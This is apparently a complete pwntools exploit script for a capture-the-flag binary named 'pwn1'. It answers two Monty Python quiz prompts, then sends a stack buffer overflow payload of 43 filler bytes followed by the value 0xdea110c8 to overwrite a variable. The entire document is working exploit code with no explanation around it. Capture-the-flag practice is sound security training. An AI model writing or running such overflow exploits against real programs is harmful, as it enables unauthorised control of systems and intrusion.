# coding: utf-8
from pwn import *
p = process("./pwn1")
p.recv()
p.sendline(b"Sir Lancelot of Camelot")
p.recv()
p.sendline(b"To seek the Holy Grail.")
p.recv()
payload = b"A"*43 + p32(0xdea110c8)
p.sendline(payload)
p.recv()
p.close()
